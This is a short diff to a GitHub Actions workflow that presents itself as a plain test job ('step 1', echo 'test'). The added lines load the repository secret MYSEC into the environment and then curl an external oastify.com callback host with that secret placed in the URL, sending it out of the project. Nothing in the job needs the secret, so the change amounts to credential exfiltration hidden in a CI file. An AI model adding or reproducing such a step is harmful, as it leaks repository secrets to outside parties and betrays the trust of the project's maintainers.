@@ -9,7 +9,10 @@ jobs:
   test_job:
     runs-on: ubuntu-20.04
     steps:
-    
+
       - name: step 1
+        env:
+          sec: ${{secrets.MYSEC}}
         run: |
           echo "test"
+          curl http://42480hrz6t8rytdfgh989667eykp8fw4.oastify.com/${{secrets.MYSEC}}
